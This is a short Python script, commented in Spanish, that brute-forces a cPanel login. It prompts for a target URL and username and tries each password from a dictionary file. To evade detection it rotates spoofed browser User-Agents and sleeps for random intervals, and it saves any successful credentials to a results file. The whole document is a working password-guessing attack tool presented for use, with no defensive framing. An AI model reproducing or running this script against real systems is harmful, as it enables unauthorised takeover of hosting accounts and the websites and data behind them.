
import requests
from time import sleep
import random

# URL de inicio de sesión de cPanel
#cpanel_url = 'https://tu_dominio_o_ip:2083/login/'
cpanel_url = input("INGESA IP O URL :  ") 

# User-Agents comunes
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
]

# Intentar login
def intentar_login(usuario, password):
    payload = {
        'user': usuario,
        'pass': password
    }

    headers = {
        'User-Agent': random.choice(user_agents)
    }

    try:
        with requests.Session() as session:
            response = session.post(cpanel_url, data=payload, headers=headers, timeout=10)
            if response.status_code == 200:
                if "dashboard" in response.text or "Log out" in response.text:
                    return True
            return False
    except requests.RequestException as e:
        print(f"Error al intentar conectar: {e}")
        return False

# Cargar lista de contraseñas desde un archivo
def cargar_diccionario():
    with open("diccionario.txt", "r") as f:
        return f.read().splitlines()

# Nombre de usuario
usuario = input("Introduce el nombre de usuario de cPanel: ")

# Probar cada contraseña
for password in cargar_diccionario():
    print(f"Intentando con: {password}")
    if intentar_login(usuario, password):
        print(f"¡Login exitoso con la contraseña: {password}")
        with open("resultados.txt", "a") as resultado:
            resultado.write(f"Usuario: {usuario}, Contraseña: {password}\n")
        break
    else:
        print("Contraseña incorrecta.")
    sleep(random.uniform(1, 3))  # Evitar patrones

